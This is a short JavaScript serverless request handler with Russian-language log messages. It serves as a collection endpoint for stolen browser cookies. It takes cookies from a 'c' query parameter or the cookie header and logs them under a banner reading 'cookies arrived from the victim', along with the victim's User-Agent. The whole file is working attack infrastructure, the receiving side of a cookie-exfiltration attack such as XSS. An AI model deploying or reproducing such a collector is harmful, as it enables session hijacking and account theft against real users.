export default function handler(req, res) {
    const cookies = req.query.c || req.headers.cookie || "куки пустые";
    console.log("=== КУКИ ПРИЛЕТЕЛИ ОТ ЖЕРТВЫ ===");
    console.log(cookies);
    console.log("User-Agent: " + req.headers['user-agent']);
    res.status(200).send("ok");
}
